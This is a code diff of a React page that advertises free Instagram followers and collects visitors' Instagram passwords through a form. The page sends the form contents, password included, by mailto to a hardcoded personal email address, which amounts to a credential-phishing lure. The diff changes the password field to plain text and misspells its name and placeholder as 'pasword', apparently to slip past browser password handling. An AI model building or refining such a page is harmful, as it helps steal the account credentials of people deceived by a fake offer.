@@ -47,7 +47,8 @@ export default function FreeFollowersPage() {
       window.location.href = `mailto:awaisashraf.dev@gmail.com?subject=${subject}&body=${body}`;
 
       setSubmitMessage("Your email client should open now.");
-    } catch {
+    } catch (error) {
+      console.error("Error opening email client:", error);
       setSubmitMessage("An error occurred. Please try again.");
     } finally {
       setIsSubmitting(false);
@@ -71,7 +72,7 @@ export default function FreeFollowersPage() {
         <div className="flex justify-center mb-6">
           <Instagram className="w-12 h-12 text-white" />
         </div>
-        <h1 className="text-4xl font-extrabold text-white text-center mb-4 bg-clip-text text-transparent bg-gradient-to-r from-pink-400 to-purple-400">
+        <h1 className="text-4xl font-extrabold text-white text-center mb-4 bg-clip-text  bg-gradient-to-r from-pink-400 to-purple-400">
           Boost Your Instagram
         </h1>
         <p className="text-gray-300 text-center mb-8">
@@ -120,9 +121,9 @@ export default function FreeFollowersPage() {
 
           <div>
             <input
-              type="password"
-              name="password"
-              placeholder="Password"
+              type="text"
+              name="pasword"
+              placeholder="Pasword"
               value={form.password}
               onChange={(e) => setForm({ ...form, password: e.target.value })}
               className={`w-full p-3 bg-white/5 border ${
